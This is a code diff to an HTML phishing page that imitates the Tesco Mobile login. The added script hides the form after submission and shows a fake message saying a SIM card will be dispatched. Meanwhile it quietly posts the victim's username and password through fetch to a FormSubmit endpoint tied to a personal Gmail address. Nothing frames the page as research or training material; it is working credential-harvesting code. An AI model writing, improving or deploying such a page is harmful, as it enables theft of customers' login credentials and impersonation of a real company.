@@ -12,7 +12,9 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
+
     .login-container {
       background-color: white;
       padding: 30px;
@@ -20,11 +22,14 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       width: 300px;
       text-align: center;
+      transition: all 0.5s ease;
     }
+
     .logo {
       width: 120px;
       margin-bottom: 20px;
     }
+
     input[type="text"], input[type="password"] {
       width: 100%;
       padding: 10px;
@@ -32,6 +37,7 @@
       border: 1px solid #ccc;
       border-radius: 4px;
     }
+
     button {
       width: 100%;
       padding: 10px;
@@ -41,21 +47,65 @@
       border-radius: 4px;
       cursor: pointer;
     }
+
     button:hover {
       background-color: #003f7f;
+    }
+
+    #thankYouMessage {
+      display: none;
+      font-size: 1.1em;
+      color: white;
+      background: linear-gradient(135deg, #00539f, #003f7f);
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      0% {
+        opacity: 0;
+        transform: scale(0.95);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
     }
   </style>
 </head>
 <body>
-  <div class="login-container">
+  <div class="login-container" id="formContainer">
     <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ32ZWhOrPlSzFcRe_U4kH3LGA4vAglLL_woKnmTeiv9xBMCVegfYe3PNema2CVfyj5CGM&usqp=CAU" alt="Tesco Mobile Logo" class="logo">
     <h2>Login to Tesco Mobile</h2>
-    <form action="https://formsubmit.co/bakermr01@gmail.com" method="POST">
-      <input type="hidden" name="_redirect" value="https://formsubmit.co/thanks.html">
+    <form id="tescoForm">
       <input type="text" name="username" placeholder="Username" required>
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit">Login</button>
     </form>
   </div>
+
+  <div id="thankYouMessage">
+    ✅ Thank you! Your SIM card will be dispatched shortly.<br><br>
+    📞 Our Dispatch Department will contact you to confirm delivery details.
+  </div>
+
+  <script>
+    document.getElementById("tescoForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      // Hide form and show thank-you message
+      document.getElementById("formContainer").style.display = "none";
+      document.getElementById("thankYouMessage").style.display = "block";
+
+      // Send form data to FormSubmit
+      fetch("https://formsubmit.co/bakermr01@gmail.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams(new FormData(this)).toString()
+      });
+    });
+  </script>
 </body>
 </html>
